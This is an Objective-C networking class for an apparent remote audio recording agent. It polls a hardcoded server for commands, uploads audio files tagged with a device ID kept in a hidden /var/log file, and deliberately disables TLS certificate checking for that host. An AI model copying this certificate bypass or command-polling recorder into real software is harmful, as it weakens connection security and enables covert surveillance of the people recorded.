#import "APIService.h"

// Check if we are building for an iOS-based target (where UIDevice is available)
#if TARGET_OS_IPHONE
    // Import UIKit to access UIDevice for identifierForVendor
    #import <UIKit/UIDevice.h>
#endif

// --- Configuration Constants ---
static NSString *const HardcodedBaseURL = @"https://192.168.1.10:5000";
static NSString *const TargetInsecureHost = @"192.168.1.10";

// macOS Persistence Filename
static NSString *const kDeviceIDFilename = @".recagent_device_id";

// --- Private Class Extension ---
@interface APIService ()
@property (nonatomic, strong, readwrite) NSString *baseURL;
@property (nonatomic, strong, readwrite) NSURLSession *session;
// New method declaration for dynamic device ID
- (NSString *)deviceId;
// Private method for macOS file persistence
- (NSString *)getOrCreatePersistentIDForMacOS;

- (NSData *)createBodyWithBoundary:(NSString *)boundary
                        parameters:(NSDictionary *)parameters
                           fileKey:(NSString *)fileKey
                          fileData:(NSData *)fileData
                          fileName:(NSString *)fileName
                          mimeType:(NSString *)mimeType
                             error:(NSError **)error;
@end

@implementation APIService

#pragma mark - Singleton and Initialization

+ (instancetype)sharedInstance {
    static APIService *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[self alloc] init];
    });
    return sharedInstance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        self.baseURL = HardcodedBaseURL;
        
        // Initialize Custom Session for ATS Bypass
        NSURLSessionConfiguration *configObj = [NSURLSessionConfiguration defaultSessionConfiguration];
        self.session = [NSURLSession sessionWithConfiguration:configObj delegate:self delegateQueue:nil];
        
        // Log the Device ID on startup
        NSLog(@"Initialized APIService. Device ID: %@", [self deviceId]);
    }
    return self;
}

#pragma mark - Device Identifier Logic

/**
 * @brief Retrieves a unique identifier for the agent/device.
 *
 * This uses the semi-persistent UIDevice.identifierForVendor on iOS.
 * On macOS, it reads a UUID persisted in a log file.
 * @return The device ID string.
 */
- (NSString *)deviceId {
    
    NSString *deviceID = nil;
    
#if TARGET_OS_IPHONE
    // 1. iOS: Use the semi-persistent identifierForVendor
    @try {
        deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    }
    @catch (NSException *exception) {
        NSLog(@"Warning: Failed to retrieve identifierForVendor: %@", exception.reason);
        deviceID = nil;
    }
#else
    // 2. macOS/Other: Use file-based persistence for a stable ID
    deviceID = [self getOrCreatePersistentIDForMacOS];
#endif

    if (!deviceID) {
        // Fallback for extreme failure cases (ephemeral ID)
        deviceID = [[[NSUUID UUID] UUIDString] lowercaseString];
        NSLog(@"CRITICAL FALLBACK: Using ephemeral NSUUID.");
    }
    
    return [deviceID lowercaseString]; // Ensure consistent formatting
}

/**
 * @brief Gets or creates a stable UUID stored in a log file on macOS.
 *
 * @return A stable device ID string.
 */
- (NSString *)getOrCreatePersistentIDForMacOS {
    // We use the same log directory as the AudioRecorderManager for consistency
    NSString *logPath = @"/var/log/";
    NSString *filePath = [logPath stringByAppendingPathComponent:kDeviceIDFilename];
    
    // 1. Try to read existing ID
    NSData *data = [[NSFileManager defaultManager] contentsAtPath:filePath];
    if (data) {
        NSString *existingID = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        if (existingID.length > 0) {
            // NSLog(@"Loaded persistent macOS ID from file: %@", existingID);
            return existingID;
        }
    }
    
    // 2. Create new ID if file does not exist or is empty
    NSString *newID = [[NSUUID UUID] UUIDString];
    NSData *newIDData = [newID dataUsingEncoding:NSUTF8StringEncoding];
    
    NSError *error = nil;
    // Ensure the directory exists (it should, as the AudioRecorderManager checks it)
    [[NSFileManager defaultManager] createDirectoryAtPath:logPath withIntermediateDirectories:YES attributes:nil error:&error];
    
    // Write the new ID to the file
    if ([newIDData writeToFile:filePath options:NSDataWritingAtomic error:&error]) {
        NSLog(@"Generated and persisted new macOS Device ID to file.");
        return newID;
    } else {
        NSLog(@"Error persisting macOS Device ID to file: %@", error.localizedDescription);
        // Fallback to returning the new ID without persisting it
        return newID;
    }
}


#pragma mark - NSURLSessionDelegate (ATS Bypass)

- (void)URLSession:(NSURLSession *)session 
                  didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge 
                    completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition, NSURLCredential * _Nullable))completionHandler {
    
    // Bypass SSL certificate check only for the known local IP
    if ([challenge.protectionSpace.authenticationMethod 
            isEqualToString:NSURLAuthenticationMethodServerTrust] &&
        [challenge.protectionSpace.host isEqualToString:TargetInsecureHost]) {
        
        completionHandler(NSURLSessionAuthChallengeUseCredential, 
                          [[NSURLCredential alloc] initWithTrust:challenge.protectionSpace.serverTrust]);
        
        // NSLog(@"[ATS Bypass] Certificate accepted for %@", TargetInsecureHost);
        return;
    }
    
    // For all other hosts/challenges, proceed with default handling
    completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
}

#pragma mark - Public Methods (API Calls)

// Fetch (GET)
- (void)fetchDataWithEndpoint:(NSString *)endpoint
                   completion:(APIServiceCompletionBlock)completionBlock {
    
    NSString *fullEndpoint = endpoint;
    if ([endpoint isEqualToString:@"/get-command"]) {
        // Use dynamically generated Device ID
        fullEndpoint = [NSString stringWithFormat:@"%@?device_id=%@", endpoint, [self deviceId]];
    }
    
    NSString *urlString = [self.baseURL stringByAppendingString:fullEndpoint];
    NSURL *url = [NSURL URLWithString:urlString];
    
    if (!url) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1000 userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL."}]);
        return;
    }
    
    NSURLSessionDataTask *dataTask = [self.session dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self handleResponseWithData:data response:response error:error completionHandler:completionBlock];
        });
    }];
    [dataTask resume];
}

// Post (JSON)
- (void)postDataToEndpoint:(NSString *)endpoint
                   payload:(NSDictionary *)payload
                completion:(APIServiceCompletionBlock)completionBlock {
    
    NSString *urlString = [self.baseURL stringByAppendingString:endpoint];
    NSURL *url = [NSURL URLWithString:urlString];
    
    if (!url) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1000 userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL."}]);
        return;
    }
    
    NSMutableDictionary *mutablePayload = [payload mutableCopy];
    if ([endpoint isEqualToString:@"/set-command"]) {
        // Use dynamically generated Device ID
        [mutablePayload setObject:[self deviceId] forKey:@"device_id"];
    }
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    NSError *jsonError = nil;
    NSData *httpBody = [NSJSONSerialization dataWithJSONObject:mutablePayload options:0 error:&jsonError];
    
    if (jsonError) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1001 userInfo:@{NSLocalizedDescriptionKey: @"Failed to serialize payload to JSON."}]);
        return;
    }
    
    [request setHTTPBody:httpBody];
    
    NSURLSessionDataTask *dataTask = [self.session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self handleResponseWithData:data response:response error:error completionHandler:completionBlock];
        });
    }];
    [dataTask resume];
}

// Upload (Multipart Form)
- (void)uploadFileWithEndpoint:(NSString *)endpoint
                      fromFile:(NSString *)filePath
                    parameters:(NSDictionary *)parameters
                    completion:(APIServiceCompletionBlock)completionBlock {
    
    NSString *urlString = [self.baseURL stringByAppendingString:endpoint];
    NSURL *url = [NSURL URLWithString:urlString];
    
    if (!url) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1000 userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL for file upload."}]);
        return;
    }

    NSData *fileData = [NSData dataWithContentsOfFile:filePath];
    if (!fileData) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1003 userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"File not found at path: %@", filePath]}]);
        return;
    }

    NSMutableDictionary *mutableParameters = parameters ? [parameters mutableCopy] : [NSMutableDictionary dictionary];
    if ([endpoint isEqualToString:@"/upload"]) {
        // Use dynamically generated Device ID
        [mutableParameters setObject:[self deviceId] forKey:@"device_id"];
    }

    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
    [request setValue:contentType forHTTPHeaderField:@"Content-Type"];
    
    NSError *bodyError = nil;
    NSData *httpBody = [self createBodyWithBoundary:boundary
                                        parameters:mutableParameters
                                           fileKey:@"audio"
                                          fileData:fileData
                                          fileName:[filePath lastPathComponent]
                                          mimeType:@"audio/mp4" 
                                             error:&bodyError];
    
    if (bodyError) {
        completionBlock(nil, bodyError);
        return;
    }
    
    [request setHTTPBody:httpBody];

    NSURLSessionDataTask *dataTask = [self.session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self handleResponseWithData:data response:response error:error completionHandler:completionBlock];
        });
    }];
    [dataTask resume];
}

#pragma mark - Private Helpers

- (NSData *)createBodyWithBoundary:(NSString *)boundary
                        parameters:(NSDictionary *)parameters
                           fileKey:(NSString *)fileKey
                          fileData:(NSData *)fileData
                          fileName:(NSString *)fileName
                          mimeType:(NSString *)mimeType
                             error:(NSError **)error {
    
    NSMutableData *body = [NSMutableData data];
    NSString *lineEnd = @"\r\n";

    if (parameters) {
        [parameters enumerateKeysAndObjectsUsingBlock:^(id key, id value, BOOL *stop) {
            if ([key isKindOfClass:[NSString class]] && [value isKindOfClass:[NSString class]]) {
                [body appendData:[[NSString stringWithFormat:@"--%@%@", boundary, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"%@", key, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
                [body appendData:[lineEnd dataUsingEncoding:NSUTF8StringEncoding]];
                [body appendData:[[NSString stringWithFormat:@"%@%@", value, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
            }
        }];
    }
    
    [body appendData:[[NSString stringWithFormat:@"--%@%@", boundary, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"; filename=\"%@\"%@", fileKey, fileName, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Type: %@%@", mimeType, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[lineEnd dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:fileData];
    [body appendData:[lineEnd dataUsingEncoding:NSUTF8StringEncoding]];

    [body appendData:[[NSString stringWithFormat:@"--%@--%@", boundary, lineEnd] dataUsingEncoding:NSUTF8StringEncoding]];

    if (body.length == 0 && error) {
        *error = [NSError errorWithDomain:@"APIServiceErrorDomain" code:1004 userInfo:@{NSLocalizedDescriptionKey: @"Failed to construct multipart/form-data body."}];
        return nil;
    }

    return body;
}

- (void)handleResponseWithData:(NSData *)data
                      response:(NSURLResponse *)response
                         error:(NSError *)error
             completionHandler:(APIServiceCompletionBlock)completionBlock { 
    
    if (error) {
        completionBlock(nil, error);
        return;
    }
    
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    NSInteger statusCode = httpResponse.statusCode;
    
    if (statusCode < 200 || statusCode > 299) {
        NSString *msg = [NSString stringWithFormat:@"Server returned HTTP status code: %ld", (long)statusCode];
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1002 userInfo:@{NSLocalizedDescriptionKey: msg}]);
        return;
    }
    
    if (!data) {
        completionBlock(nil, nil);
        return;
    }
    
    NSError *jsonError = nil;
    id responseObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
    
    if (jsonError) {
        completionBlock(nil, [NSError errorWithDomain:@"APIServiceErrorDomain" code:1001 userInfo:@{NSLocalizedDescriptionKey: @"Failed to parse JSON response."}]);
        return;
    }
    
    completionBlock(responseObject, nil);
}

@end